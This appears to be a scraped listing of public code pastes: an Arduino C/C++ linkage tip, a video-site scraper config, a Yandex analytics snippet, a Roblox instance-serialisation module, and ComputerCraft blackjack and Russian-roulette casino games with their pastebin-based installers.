    const d = Math.sqrt((Factored_Moment*1000000)/(0.1379*1000*Concrete_grade));

    if (Effective_depth>d)
    {
        const a = (((Steel_Strength)**2)*0.87)/(Concrete_grade*1000)
        const b = -(Steel_Strength[0][8]*0.87*Effective_depth)
        const c = Factored_Moment*1000000;
    }
  



    
    
  return (
    <div>
      
    </div>
  )
}

export default OneWaySlab

"
BRMFAHwe,Using C files in Arduino,chayanforyou,C,Friday 7th of July 2023 01:59:55 AM CDT,"The .ino files of Arduino sketches are compiled as C++ after a little bit of preprocessing. If you want to use C functions in C++, you need to wrap their declarations in:

extern ""C"" {}
There are a couple ways you can do this:

In the sketch:

extern ""C"" {
#include ""SomeCFunctions.h""
}
Or, in the .h file:

#ifdef __cplusplus
extern ""C"" {
#endif

// C function declarations here

#ifdef __cplusplus
}
#endif"
60U3mYUU,kumaotv,Damonwei,JSON,Friday 7th of July 2023 01:53:07 AM CDT,"{
""author"":""Dwei-0706"",
""ua"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"",
""homeUrl"": ""https://www.kumaotv.com/"",
""cateManual"": {""电视剧"": ""2"",""电影"": ""1"",""动漫"": ""4"",""综艺"": ""3""},
""homeVodNode"": ""//div[contains(@class,'stui-vodlist__box')]/a"",
""homeVodName"": ""/@title"",
""homeVodId"": ""/@href"",
""homeVodIdR"": """",
""homeVodImg"": ""/@data-original"",
""homeVodImgR"": """",
""homeVodMark"": ""//span[@class='pic-text text-right']/text()"",
""cateUrl"": ""https://www.kumaotv.com/vodtype/{cateId}-{catePg}.html"",
""cateVodNode"": ""//div[contains(@class,'stui-vodlist__box')]/a"",
""cateVodName"": ""/@title"",
""cateVodId"": ""/@href"",
""cateVodIdR"": """",
""cateVodImg"": ""/@data-original"",
""cateVodImgR"": """",
""cateVodMark"": ""//span[@class='pic-text text-right']/text()"",
""dtUrl"":""https://www.kumaotv.com{vid}"",
""dtNode"": ""//body"",
""dtName"": ""//h1/text()"",
""dtNameR"": """",
""dtImg"": ""//div[@class='stui-content__thumb']/a/img/@data-original"",
""dtImgR"": """",
""dtCate"": ""concat(//p[contains(@class,'data')][1]/a/text())"",
""dtCateR"": """",
""dtYear"": """",
""dtYearR"": """",
""dtArea"": """",
""dtAreaR"": """",
""dtMark"": """",
""dtMarkR"": """",
""dtDirector"": ""concat(//p[contains(@class,'data')][3]/a/text())"",
""dtDirectorR"": """",
""dtActor"": ""concat(//p[contains(@class,'data')][2]/a/text())"",
""dtActorR"": """",
""dtDesc"": ""concat('Dwei观影提示：资源播放失败可切换不同线路或点击快速搜索其他站点观看，若线路存在广告请勿相信！！简介：',//p[contains(@class,'desc')]//text())"",
""dtFromNode"": ""//ul[contains(@class,'nav nav-tabs ')]/li/a"",
""dtFromName"":  ""/text()"",
""dtFromNameR"": """",
""dtUrlNode"": ""//ul[contains(@class,'stui-content__playlist')]"",
""dtUrlSubNode"": ""/li/a"",
""dtUrlId"": ""/@href"",
""dtUrlIdR"": """",
""dtUrlName"": ""/text()"",
""dtUrlNameR"": """",
""playUrl"":""https://www.kumaotv.com{playUrl}"",
""searchUrl"":""https://www.kumaotv.com/vodsearch/-------------.html?wd={wd}"",
""scVodNode"":""//a[contains(@class,'stui-vodlist__thumb')]"",
""scVodName"":""/@title"",
""scVodId"":""/@href"",
""scVodImg"":""/@data-original"",
""scVodMark"":""//span[@class='pic-text text-right']/text()""
}"
BZyKWsQA,yandex metrika,FladeX,HTML,Friday 7th of July 2023 01:49:32 AM CDT,"<!-- Yandex.Metrika counter -->
<script type=""text/javascript"" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, ""script"", ""https://mc.yandex.ru/metrika/tag.js"", ""ym"");

   ym(94233870, ""init"", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src=""https://mc.yandex.ru/watch/94233870"" style=""position:absolute; left:-9999px;"" alt="""" /></div></noscript>
<!-- /Yandex.Metrika counter -->"
tAgPWFxX,Properties,mrfrinkler,Lua,Friday 7th of July 2023 12:36:02 AM CDT,"local HTTPS = game:GetService(""HttpService"")
local dsService = game:GetService(""DataStoreService"");
local ds = dsService:GetDataStore(""PlayerData"");
local apps = dsService:GetOrderedDataStore(""Apps"");
local AppData = dsService:GetDataStore(""AppData"")
local module = {}

module.__AllProperties__ = HTTPS:GetAsync(""https://pastebin.com/raw/QiAyL2wA"")
module.AllProperties = HTTPS:JSONDecode(module.__AllProperties__);
module.convert = require(game.ReplicatedStorage.Mods.convert)

function getObjectFromFullName(FullName:string,ins:Instance?,key:string,checkDone)
	if key=='Parent' then return end
	print(FullName)	
	task.spawn(function()
		repeat task.wait() until checkDone()
		task.wait()
		local value = module.convert.getObjectFromFullName(FullName)
		warn(""FIRING AFTER CODE"",key,value)
		pcall(function()
			ins[key] = value
		end)
	end)
end
function module.GetAllPropertiesFromClassName(className:string)
	local class:{directproperties:{string},inherited:{string}} = module.AllProperties[className];
	local props = class.directproperties;
	for _,Class in class.inherited do
		for _,v in module.GetAllPropertiesFromClassName(Class) do
			if not table.find(props,v) then
				table.insert(props,v);
			end
		end
	end
	return props;
end

function module.GetAllProperties(instance:Instance,returnInLua:boolean?,dontJson:boolean?,exeptions:string|""table""|nil,otherData:{}?):(string|{})
	local className = instance.ClassName
	local props = {}
	for _,propName in module.GetAllPropertiesFromClassName(className) do
		local a,b = pcall(function()
			local value = instance[propName]
			if not returnInLua then
				if type(value)==""userdata"" or type(value)==""vector"" then
					if typeof(value)==""Instance"" and exeptions==""table"" and propName~=""Parent"" and not instance:IsA(""BasePart"") then
						warn(propName)
						local ins = value.Parent
						local path = value.Name
						local i = 0
						while task.wait() do
							i+=1
							path = ins.Name..'.'..path
							if otherData.MasterInstance==ins then
								value = {UserDataType=typeof(value),[""Value""]=path,LocalPath=true}
								warn(""STOP---"")
								break
							end
							ins = ins.Parent
							if not ins then break end
						end
					else
						local v =tostring(value)
						if typeof(value)==""Instance"" then v = value:GetFullName() end
						value = {UserDataType=typeof(value),[""Value""]=v}
					end

				end
			end 
			props[propName] = value
		end)
	end
	if returnInLua then
		return props
	end
	return dontJson and props or HTTPS:JSONEncode(props)
end

function module.GenerateInstancesFromProperties(className:string,properties:string|{},custom:{mode:string,checkDone:()->(boolean),master:""self""|Instance}?)
	local new = Instance.new(className)
	--[[if type(properties)==""table"" then
		for property,value in properties do
			pcall(function()
				new[property] = value
			end)
		end
		return new
	end--]]
	--local _p = game:GetService(""HttpService""):JSONDecode(properties);
	for key,value in properties do
		local allow = true
		if typeof(value)==""table"" then
			if value.UserDataType==""EnumItem"" then
				local values = value.Value:split(""."")
				value = Enum[values[2] ][values[3] ]
			elseif value.UserDataType==""Instance"" then
				if value.LocalPath and custom and custom.mode==""table"" then
					local master:Instance = custom.master
					master = master=='self' and new or master
					value.Value = 'game.'..master.Parent:GetFullName()..'.'..value.Value
					--print(value.Value)
					value = getObjectFromFullName(value.Value,new,key,custom.checkDone)
					if key=='Value' then
						warn(69,value)
					end
				else
					value = getObjectFromFullName(value.Value,new,key,custom.checkDone)
				end
			else
				local code = string.format(""return %s.new(%s)"",value.UserDataType,value.Value)
				if string.match(value.Value,'%a') then
					code = string.format(""return %s.new('%s')"",value.UserDataType,value.Value)
				end
				local v = loadstring(code)()
				value = v
			end
		end
		if key=='Value' then
			warn(69,value)
		end
		local a,b = pcall(function()
			--print(key,value)
			new[key] = value
		end)
	end
	return new
end

function goThoughChildren(instance:Instance,MASTERINSTANCE:Instance)
	local children = {}
	local __children__ = instance:GetChildren()

	for i,child in __children__ do
		local Props = module.GetAllProperties(child,false,true,""table"",{MasterInstance=MASTERINSTANCE})
		local Children = goThoughChildren(child,MASTERINSTANCE)
		children[i]={[""Properties""]=Props,[""Children""]=Children,Name=child:GetFullName()}
	end
	return children
end

function module.GenerateTableFromInstance(instance:Instance)
	local props = module.GetAllProperties(instance,false,true,""table"",{MasterInstance=instance})
	local children = goThoughChildren(instance,instance)
	return {[""Properties""]=props,[""Children""]=children,Name=instance:GetFullName()}
end
function go(children,Parent,master,checkDone)
	for _,child:{Properties:{},Children:{}} in children do
		local instance = module.GenerateInstancesFromProperties(child.Properties.ClassName,child.Properties,{mode=""table"",master=master,[""checkDone""]=checkDone})
		print(""INST"",instance)
		instance.Parent = Parent
		go(child.Children,instance,master,checkDone)
	end
end
function module.GenerateInstanceFromTable(data:{Properties:{},Children:{}},Parent:Instance)
	local done = false
	local function checkDone()
		return done
	end
	local children = data.Children
	local instance = module.GenerateInstancesFromProperties(data.Properties.ClassName,data.Properties,{mode=""table"",master='self',[""checkDone""]=checkDone})
	warn(""INST"",instance)
	instance.Parent = Parent
	warn(instance.Parent)
	go(children,instance,instance,checkDone)
	done = true
	warn(""DONE"")
	return instance
end

return module"
BV6QGu75,BlackJackInstaller,Honeth,Lua,Friday 7th of July 2023 12:23:21 AM CDT,"local confirm = false
local install = false
function text()
    term.setCursorPos(13, 7)
    print(""this will create a startup."")
    term.setCursorPos(14, 8)
    print(""do you want to continue?"")
end
function confirmation()
    term.setCursorPos(18, 10)
    local event, key, isHeld = os.pullEvent(""key"")
    if key == keys.left then
        write("">Yes<     No "")
        confirm = true
    elseif key == keys.right then
        write("" Yes     >No<"")
        confirm = false
    end

end

term.clear()
term.setCursorPos(18, 10)
print("" Yes     >No<"")
while install == false do
    text()
    confirmation()
    local event, key, isHeld = os.pullEvent(""key"")
    if confirm and key == keys.enter then
        install = true
    end
end
term.clear()
term.setCursorPos(1, 1)
shell.run(""pastebin get 2FC16Sbd startup.lua"")
shell.run(""pastebin get 8NQMcCbP cardBack.nfp"")
shell.run(""pastebin get pvQ1sHtq card.nfp"")
shell.run(""pastebin get ti4WSLqQ logo.nfp"")
shell.run(""pastebin get XnaeApmk cards.lua"")
shell.run(""pastebin get 4K2NC5Dq pinapi.lua"")
shell.run(""pastebin get 3qT4XqAs api.lua"")"
pvQ1sHtq,Bj card nfp,Honeth,Lua,Friday 7th of July 2023 12:21:20 AM CDT," fffff
f00000f
f00000f
f00000f
f00000f
f00000f
 fffff
"
XnaeApmk,BJ cards,Honeth,Lua,Friday 7th of July 2023 12:20:38 AM CDT,"deck = {
--{value, char, suit}--
    {1, ""A"", ""\3""},
    {2, 2, ""\3""},
    {3, 3, ""\3""},
    {4, 4, ""\3""},
    {5, 5, ""\3""},
    {6, 6, ""\3""},
    {7, 7, ""\3""},
    {8, 8, ""\3""},
    {9, 9, ""\3""},
    {10, 10, ""\3""},
    {10, ""J"", ""\3""},
    {10, ""Q"", ""\3""},
    {10, ""K"", ""\3""},
    {1, ""A"", ""\4""},
    {2, 2, ""\4""},
    {3, 3, ""\4""},
    {4, 4, ""\4""},
    {5, 5, ""\4""},
    {6, 6, ""\4""},
    {7, 7, ""\4""},
    {8, 8, ""\4""},
    {9, 9, ""\4""},
    {10, 10, ""\4""},
    {10, ""J"", ""\4""},
    {10, ""Q"", ""\4""},
    {10, ""K"", ""\4""},
    {1, ""A"", ""\5""},
    {2, 2, ""\5""},
    {3, 3, ""\5""},
    {4, 4, ""\5""},
    {5, 5, ""\5""},
    {6, 6, ""\5""},
    {7, 7, ""\5""},
    {8, 8, ""\5""},
    {9, 9, ""\5""},
    {10, 10, ""\5""},
    {10, ""J"", ""\5""},
    {10, ""Q"", ""\5""},
    {10, ""K"", ""\5""},
    {1, ""A"", ""\6""},
    {2, 2, ""\6""},
    {3, 3, ""\6""},
    {4, 4, ""\6""},
    {5, 5, ""\6""},
    {6, 6, ""\6""},
    {7, 7, ""\6""},
    {8, 8, ""\6""},
    {9, 9, ""\6""},
    {10, 10, ""\6""},
    {10, ""J"", ""\6""},
    {10, ""Q"", ""\6""},
    {10, ""K"", ""\6""}
}

dealer = {}

player = {}"
4K2NC5Dq,BJ pinapi,Honeth,Lua,Friday 7th of July 2023 12:19:41 AM CDT,"---Settings---
local keypad = {
--{num,xpos,ypos}--
    {1, 20, 20},
    {2, 25, 20},
    {3, 30, 20},
    {4, 20, 22},
    {5, 25, 22},
    {6, 30, 22},
    {7, 20, 24},
    {8, 25, 24},
    {9, 30, 24},
    {10, 20, 26}, --clear
    {0, 25, 26},
    {11, 30, 26} --enter
}

local input = """"

---Functions---

--Checks to see if the x and y click is a button--
function checkClick(t, x, y)
    for i,v in pairs(t) do
        local num, cx, cy = unpack(v)
        if (x >= cx) and (x <= cx + 2) and (y == cy) then
	        return true, num
	    end
    end
  return false
end

--Draws the number pressed--
function numClick(num)
    if num ==  11 then
        return true, 0
    elseif num == 10 then
        return true, 1
    else
        input = input .. num
        term.write(tostring(num))
        return false
    end
end

--Main program--

function pinpad(xx, yy)
    input = """"
    term.setBackgroundColor(colors.brown)
    term.setTextColor(1)
    for i, v in pairs(keypad) do
        local num, x, y = unpack(v)
        term.setCursorPos(x, y)
        if num == 10 then
            term.setBackgroundColor(colors.red)
            term.write("" "" .. ""C"" .. "" "")
        elseif num == 11 then
            term.setBackgroundColor(colors.green)
            term.write("" "" .. ""E"" .. "" "")
        else
            term.setBackgroundColor(colors.brown)
            term.write("" "" .. num .. "" "")
        end
    end
    term.setBackgroundColor(colors.green)
    term.setTextColor(1)
    term.setCursorPos(xx, yy)
    while true do
        --Checks to see if player has clicked on the screen--
        local event, button, x, y = os.pullEvent(""monitor_touch"")
        --Checks if x and y pressed are a button--
        local validClick, num = checkClick(keypad, x, y)
        if (validClick) then
            local triger, but = numClick(num)
            if (triger) then
                if but == 0 then
                    local tig = input
                    input = """"
                    return true, tig
                elseif but == 1 then
                    return false
                end
            end
        end
    end
end
"
3qT4XqAs,BJ api,Honeth,Lua,Friday 7th of July 2023 12:19:08 AM CDT,"---Settings---
version = ""0.7""
local buttons = {
    {""Stand"", 16, colors.black, 15, 21},
    {""Hit"", 22, colors.gray, 21, 25},
    {""Double"", 26, colors.red, 25, 32}
}
local button = {
    {""Stand"", 19, colors.black, 18, 24},
    {""Hit"", 25, colors.gray, 24, 28}
}

local color = 0
local loop = true

os.loadAPI(""./pinapi.lua"")

function clear()
    term.setBackgroundColor(8192)
    term.clear()
end


function drawCard(x, y, char, suit)
	if (suit == ""\5"" or suit == ""\6"") then
		color = colors.black
    else
        color = colors.red
    end
    local pic = paintutils.loadImage(""card.nfp"")
    paintutils.drawImage(pic, x, y)
    term.setCursorPos(x + 1, y + 1)
    term.setBackgroundColor(1)
    term.setTextColor(color)
    print(char)
    term.setCursorPos(x + 3, y + 3)
    print(suit)
	if char == 10 then
		term.setCursorPos(x + 4, y + 5)
	else
    	term.setCursorPos(x + 5, y + 5)
	end
    print(char)
end

function drawBack(x, y)
    local pic = paintutils.loadImage(""cardBack.nfp"")
    paintutils.drawImage(pic, x, y)
end

function drawBet(x, y, bal)
    while true do
        clear()
        term.setCursorPos(1, 1)
        term.setTextColor(colors.black)
        term.write(""Credits: ""..bal)
        local pic = paintutils.loadImage(""./logo.nfp"")
        paintutils.drawImage(pic, x, y)
        term.setBackgroundColor(colors.green)
        term.setCursorPos(x + 9 , y + 11)
        term.setTextColor(1)
        term.write(""Bet: "")
        local isBet, bet = pinapi.pinpad(x + 13, y + 11)
        bet = tonumber(bet)
        if (isBet) then
            if bet ~= nil then
                if bet > 0 then
                    if bet < bal or bet == bal then
                        return bet
                    end
                end
            end
        end
    end
end

function drawButton(double)
    term.setTextColor(1)
    if (double) then
        for k, v in pairs(buttons) do
            term.setBackgroundColor(buttons[k][3])
            term.setCursorPos(buttons[k][2], 30)
            term.write(buttons[k][1])
        end
    else
        for k, v in pairs(button) do
            term.setBackgroundColor(button[k][3])
            term.setCursorPos(button[k][2], 30)
            term.write(button[k][1])
        end
    end
end

function checkPress(x, y, double)
    if (double) then
        if y == 30 then
            if x > buttons[1][4] and x < buttons[1][5] then
                return true, 1
            elseif x > buttons[2][4] and x < buttons[2][5] then
                return true, 2
            elseif x > buttons[3][4] and x < buttons[3][5] then
                return true, 3
            else
                return false
            end
        end
    else
        if y == 30 then
            if x > button[1][4] and x < button[1][5] then
                return true, 1
            elseif x > button[2][4] and x < button[2][5] then
                return true, 2
            else
                return false
            end
        end
    end
end
"
2FC16Sbd,BJ Startup,Honeth,Lua,Friday 7th of July 2023 12:17:01 AM CDT,"os.loadAPI(""./cards.lua"")
os.loadAPI(""./api.lua"")
card = cards.deck[num]

local pause = true
local limit = 0
local bet = limit
local running = false
local newCreds = 0
local creds = 0
local screen = peripheral.wrap(""left"")
local drive = peripheral.wrap(""bottom"")
local xCords = {
    {23},
    {18, 26},
    {14, 22, 30},
    {10, 18, 26, 34},
    {6, 14, 22, 30, 38},
    {3, 11, 19, 27, 35, 43}
}



function runGame(balance)
    ---Setup---
    running = false
    local xOffset = 2
    local xOffsetDealer = 2
    local double = false
    local doubled = false
    term.clear()
    term.redirect(screen)
    term.setCursorPos(1,1)
    api.clear()

    function isAce(dealer)
        --For the dealer--
        if (dealer) then
            for k, v in pairs(cards.dealer) do
                if (cards.dealer[k][2] == ""A"") then
                    return true
                end
            end
            return false
        --For the player--
        else
            for k, v in pairs(cards.player) do
                if (cards.player[k][2] == ""A"") then
                    return true
                end
            end
            return false
        end
    end



    function getTotal(dealer)
        --For the dealer--
        if (dealer) then
            --Adds card values together--
            local dealerFuncTotal = 0
            for k, v in pairs(cards.dealer) do
                dealerFuncTotal = dealerFuncTotal + cards.dealer[k][1]
            end
            if (isAce(true)) then
                --If there is an ace and the total is less than 12 than offset score by 10--
                if (dealerFuncTotal > 11) then
                    return dealerFuncTotal
                else
                    return dealerFuncTotal + 10
                end
            else
                return dealerFuncTotal
            end
        --For the player--
        else
            --Adds card values together--
            local funcTotal = 0
            for k, v in pairs(cards.player) do
                funcTotal = funcTotal + cards.player[k][1]
            end
            if (isAce(false)) then
                --If there is an ace and the total is less than 12 than offset score by 10--
                if (funcTotal > 11) then
                    return funcTotal
                else
                    return funcTotal + 10
                end
            else
                return funcTotal
            end
        end
    end

    function endGame()
        api.clear()
        local count = 1
        for k, v in pairs(cards.dealer) do
            api.drawCard(xCords[xOffsetDealer][count], 5, cards.dealer[k][2], cards.dealer[k][3])
            count = count + 1
        end
        count = 1
        for k, v in pairs(cards.player) do
            api.drawCard(xCords[xOffset][count], 22, cards.player[k][2], cards.player[k][3])
            count = count + 1
        end
    end

    function dealerHit()
        if xOffsetDealer < 6 then
            --Preps screen--
            api.clear()
            xOffsetDealer = xOffsetDealer + 1
            --Picks a random card from the deck--
            local rand = math.random(1, table.maxn(cards.deck))
            local card = cards.deck[rand]
            --Moves card from the deck to the dealers hand--
            table.remove(cards.deck, rand)
            table.insert(cards.dealer, card)
            
            --Draws players cards--
            local count = 1
            for k, v in pairs(cards.player) do
                api.drawCard(xCords[xOffset][count], 22, cards.player[k][2], cards.player[k][3])
                count = count + 1
            end
            --Draws dealers cards--
            count = 1
            for k, v in pairs(cards.dealer) do
                api.drawCard(xCords[xOffsetDealer][count], 5, cards.dealer[k][2], cards.dealer[k][3])
                count = count + 1
                sleep(1)
            end
            return false
        else
            return true
        end
    end

    function hit()
        if xOffset < 6 then
            xOffset = xOffset + 1
            --Preps screen--
            api.clear()
            api.drawButton(double)
            --Draws dealers cards--
            api.drawCard(xCords[2][1], 5, cards.dealer[1][2], cards.dealer[1][3])
            --Dealers second card is hidden untill the has finished--
            api.drawBack(xCords[2][2], 5)
            local success = true
            --look into this success var--
            
            --Picks a random card from the deck--
            local rand = math.random(1, table.maxn(cards.deck))
            local card = cards.deck[rand]
            --Moves card from the deck to the playes hand--
            table.remove(cards.deck, rand)
            table.insert(cards.player, card)
            
            --Draws players cards--
            local count = 1
            for k, v in pairs(cards.player) do
                api.drawCard(xCords[xOffset][count], 22, cards.player[k][2], cards.player[k][3])
                count = count + 1
            end
            return false
        else
            return true
        end
    end

    --Betting--
    local bet = api.drawBet(10, 5, balance)
    if (bet < limit) then
        bet = limit
    end
    newCreds = creds - bet
    running = true
    writeCard()
    readCard()
    --Get players cards--
    api.clear()
    local rand = math.random(1, table.maxn(cards.deck))
    local card = cards.deck[rand]
    table.remove(cards.deck, rand)
    table.insert(cards.player, card)
    
    rand = math.random(1, table.maxn(cards.deck))
    card = cards.deck[rand]
    table.remove(cards.deck, rand)
    table.insert(cards.player, card)

    --Draws players cards--
    local count = 1
    for k, v in pairs(cards.player) do
        api.drawCard(xCords[xOffset][count], 22, cards.player[k][2], cards.player[k][3])
        count = count + 1
    end
    
    --Get dealers cards--
    rand = math.random(1, table.maxn(cards.deck))
    card = cards.deck[rand]
    table.remove(cards.deck, rand)
    table.insert(cards.dealer, card)
    
    rand = math.random(1, table.maxn(cards.deck))
    card = cards.deck[rand]
    table.remove(cards.deck, rand)
    table.insert(cards.dealer, card)
    --Draws dealers cards--
    api.drawCard(xCords[2][1], 5, cards.dealer[1][2], cards.dealer[1][3])
    --Dealers second card is hidden untill the has finished--
    api.drawBack(xCords[2][2], 5)

    --Gets players and dealers totals--
    local dealerTotal = getTotal(true)
    local total = getTotal(false)

    --If the dealer of player has 21 they win--
    if (dealerTotal == 21) and not (total == 21) then
        api.drawCard(xCords[2][2], 5, cards.dealer[2][2], cards.dealer[2][3])
        return false, bet
    elseif (total == 21) and not (dealerTotal == 21) then
        api.drawCard(xCords[2][2], 5, cards.dealer[2][2], cards.dealer[2][3])
        return true, bet*3
    elseif (total == 21) and (dealerTotal == 21) then
        return false, (bet == bet - bet)
    end
    
    if bet + bet > balance then
        api.drawButton(false)
        double = false
    else
        api.drawButton(true)
        double = true
    end
    ---Main code---
    local success = true
    while (success) do
        --Checks to see if player has clicked on the screen--
        local event, perph, xp, yp = os.pullEvent(""monitor_touch"")
        --Checks if x and y pressed are a button--
        local pres, butt = api.checkPress(xp, yp, double)
        if (pres) then
            if butt == 1 then
                --If they pressed stand it exits the loop--
                success = false
            elseif butt == 2 then
                --If they pressed hit they cant use double anymore--
                double = false
                --Gets they player another card
                local full = hit()
                if (full) then
                    --If the player had 6 cards when they, hit they get 1 more card--
                    total = getTotal(false)
                    local rand = math.random(1, table.maxn(cards.deck))
                    api.drawCard(xCords[1][1], 13, cards.deck[rand][2], cards.deck[rand][3])
                    total = total + cards.deck[rand][1]
                    --If they dont go bust they win--
                    if total > 21 then
                        return false, bet
                    else
                        return true, bet*2
                    end
                else
                    --Check total with new card to see if they go bust--
                    total = getTotal(false)
                    if total > 21 then
                        --If they go bust they lose--
                        endGame()
                        return false, bet*2
                    end
                end
            elseif butt == 3 then
                if (double) then
                    --If they pressed double and double is an option they get one more card--
                    newCreds = creds - bet
                    writeCard()
                    hit()
                    
                    --Check total with new card to see if they go bust--
                    total = getTotal(false)
                    if total > 21 then
                        --If they go bust they lose--
                        endGame()
                        local winnings = bet + bet
                        return false, winnings
                    end
                    
                    --If they dont go bust it exits the loop and their bet is doubled--
                    doubled = true
                    success = false
                end
            end
        end
    end


    --Stand--
    api.clear()
    count = 1
    for k, v in pairs(cards.dealer) do
        api.drawCard(xCords[2][count], 5, cards.dealer[k][2], cards.dealer[k][3])
        count = count + 1
    end

    --Keeps getting the dealer another card untill they go bust or their total is more than 16--
    dealerTotal = getTotal(true)
    while dealerTotal < 17 do
        local dfull = dealerHit()
        if (dfull) then
            --If the dealer had 6 cards when they hit, they get 1 more card--
            dealerTotal = getTotal(true)
            api.drawCard(xCords[1][1], 13, cards.deck[count][2], cards.deck[count][3])
            dealerTotal = dealerTotal + cards.deck[count][1]
            --If they dont go bust they win--
            if dealerTotal > 21 then
                --Returns true if the dealer goes bust--
                --It works out the winnings--
                if (doubled) then
                    --Doubles the bet if they doubled--
                    local winnings = bet + bet
                    return true, winnings
                else
                    return true, bet
                end
            else
                --Returns false if the dealer doesn't goes bust--
                --It works out the winnings--
                if (doubled) then
                    --Doubles the bet if they doubled--
                    local winnings = bet + bet
                    return false, winnings
                else
                    return false, bet
                end
            end
        else
            --Checks if the dealer went bust--
            dealerTotal = getTotal(true)
            if dealerTotal > 21 then
                endGame()
                --Returns true if the dealer goes bust--
                --It works out the winnings--
                if (doubled) then
                    --Doubles the bet if they doubled--
                    local winnings = bet + bet
                    return true, winnings
                else
                    return true, bet
                end
            end
        end
    end

    --If the player and dealer havent won or gone bust by this point they check totals--
    total = getTotal(false)
    if dealerTotal > total then
        --Player has less than dealer so they loss--
        endGame()
        if (doubled) then
            --Doubles the bet if they doubled--
            local winnings = bet + bet
            return false, winnings
        else
            return false, bet
        end
    elseif total > dealerTotal then
        --Player has more than dealer so they win--
        endGame()
        if (doubled) then
            --Doubles the bet if they doubled--
            local winnings = bet + bet
            return true, winnings
        else
            return true, bet
        end
    elseif total == dealerTotal then
        --They have the same score so its a push--
        endGame()
        return true, 0
    else
        error(""Cant Calculate Score"")
    end
end

function readCard()
    if not fs.exists(""disk/creds.lua"") then
        term.clear()
        term.setCursorPos(6, 10)
        term.write(""{Please get a Mcard from the Cashier!}"")
        term.setCursorPos(13,18)
        term.write(""Remove disk to continue!"")
        while fs.exists(""disk/"") do
            local event, perph, xp, yp = os.pullEvent(""disk_eject"")
            if event == ""disk_eject"" then
                os.reboot()
            else
                sleep(1)
            end
        end
    end
    local Card = fs.open(""disk/creds.lua"", ""r"")
    data = Card.readAll()
    Card.close()
    a, b = string.find(data, ""11066011"")
    c, d = string.find(data, ""11077011"")
    creds = tonumber(string.sub(data, b+1,c-1))
    if creds <= limit and running == false then
        drive.ejectDisk()
        sleep(5)
        os.reboot()
    else
    end
    if creds < limit and running == false then
        paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
        term.clear()
        term.setCursorPos(5, 10)
        term.write(""{you don't have enough credits to continue}"")
        term.setCursorPos(13,18)
        term.write(""Refill your Mcard to proceed!"")
        while fs.exists(""disk/"") do
            local event, perph, xp, yp = os.pullEvent(""disk_eject"")
            if event == ""disk_eject"" then
                sleep(5)
                os.reboot()
            else
                sleep(1)
            end
        end
    end
end

function writeCard()
    readCard()
    if not fs.exists(""disk/creds.lua"") then
        os.reboot()
    end
    local Card = fs.open(""disk/creds.lua"", ""w"")
    data = (tostring(math.random(1, 163456))..""11066011""..tostring(newCreds)..""11077011""..tostring(math.random(1, 163456)))
    Card.write(tostring(data))
    Card.close()
    disk.setLabel(""bottom"", ""Honcino credits: ""..tostring(newCreds))
end     

function insert_card()
    paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
    while not fs.exists(""disk/"") do
        term.clear()
        paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
        term.setCursorPos(16, 10)
        term.write(""{please insert card}"")
        sleep(1)

    end
    -- term.clear()
end

while 1 do
    screen = peripheral.wrap(""left"")
    term.redirect(screen)
    insert_card()
    readCard()
    term.redirect(screen)
    local win, bat = runGame(creds)
            term.setCursorPos(16, 30)
            term.setBackgroundColor(colors.green)
            if (win) then
                term.setTextColor(colors.red)
                term.write(""You Win: "")
                term.write(tostring(bat))
                --Add winnings to their card--
                newCreds = creds + bat
                writeCard()
            else
                term.setTextColor(colors.black)
                term.write(""You Lose: "")
                term.write(tostring(bat))
            end
    term.setCursorPos(17,18)
    term.write(""Touch to Continue"")
    local event, perph, xp, yp = os.pullEvent(""monitor_touch"")
    while pause == true do
        if event == ""monitor_touch"" then
            os.reboot()
            break
        else
        sleep(1)
        end 
    end
end"
mTt4NUxn,Russian Roulette Installer,Honeth,Lua,Friday 7th of July 2023 12:14:53 AM CDT,"----------------------------------------------------------------
--to start this file make sure there are no other files on the computer
--and when you install this file don't give it the name startup.lua
----------------------------------------------------------------
--		manual
--
-- when you use this place your computer on a disk drive for Mcards from the cashier (one of my previous scripts)
-- to control it use your up and down arrow keys to change the bidding amount and enter to confirm your amount
-- when you are blaying you can klick on the chamber where you think there is no bullet (you can't klick twice on te same place)
-- when you press enter you will spin the chamber of the revolver (like in rusian roulette) 
-- when you spin the gun you can klick on all places again
-----------------------------------------------------------------------------------

local confirm = false
local install = false
function text()
    term.setCursorPos(13, 7)
    print(""this will create a startup."")
    term.setCursorPos(14, 8)
    print(""do you want to continue?"")
end
function confirmation()
    term.setCursorPos(18, 10)
    local event, key, isHeld = os.pullEvent(""key"")
    if key == keys.left then
        write("">Yes<     No "")
        confirm = true
    elseif key == keys.right then
        write("" Yes     >No<"")
        confirm = false
    end

end

term.clear()
term.setCursorPos(18, 10)
print("" Yes     >No<"")
while install == false do
    text()
    confirmation()
    local event, key, isHeld = os.pullEvent(""key"")
    if confirm and key == keys.enter then
        install = true
    end
end
term.clear()
term.setCursorPos(1, 1)
shell.run(""pastebin get 3Bae6XDn startup.lua"")
shell.run(""pastebin get 2wmTXThB images/chamber.nfp"")
shell.run(""pastebin get 9wPaCvmq images/revolver.nfp"")"
3Bae6XDn,Russian Roulette,Honeth,Lua,Friday 7th of July 2023 12:14:02 AM CDT,"term.redirect(peripheral.wrap(""left""))

-------------things to change------------------
local limit = 100				--the minimum to play
local perc = 0.15				--how much you earn each shot (100% = 1.00 and 1% = 0.01)
------------------------------




local upperLimit = 0
local amount = limit
local earn = 0
local death = false
local earned = 0
local ongoing = true
local enter = true
-----------------------------------

one = true
two = true
three = true
four = true
five = true
six = true

function readCard()
    if not fs.exists(""disk/creds.lua"") then
        os.reboot()
    end
    local Card = fs.open(""disk/creds.lua"", ""r"")
    data = Card.readAll()
    Card.close()
    a, b = string.find(data, ""11066011"")
    c, d = string.find(data, ""11077011"")
    creds = tonumber(string.sub(data, b+1, c-1))
    if creds < limit then
